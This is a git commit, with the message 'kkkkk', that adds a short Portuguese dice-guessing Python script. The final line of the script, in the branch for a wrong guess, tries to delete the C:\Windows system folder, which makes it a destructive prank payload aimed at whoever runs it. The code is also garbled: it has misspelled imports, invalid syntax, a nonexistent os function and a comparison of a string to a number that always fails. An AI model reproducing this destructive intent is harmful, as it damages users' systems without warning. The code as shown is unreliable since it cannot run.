1cb7848c59586a6652444533d3e48b883efb88b1
GBazon <118981107+GuiBazon@users.noreply.github.com>
2025-06-17 20:24:00 -0300

    kkkkk

---
+++ slaa.py
@@ -0,0 +1,16 @@
+print('Olá, mudo')
+umport time
+import random
+import os
+
+escolha = input('Escolha um numero de 1 a 6')
+numero = random.randint(1, 6)
+if escolha == numero:
+    time sleep(3)
+    print('Sorte em pae')
+    time.sleep(3)
+else:
+    time.sleep(3)
+    print('ops')
+    time.sleep(5)
+    os.del(C\Windows)
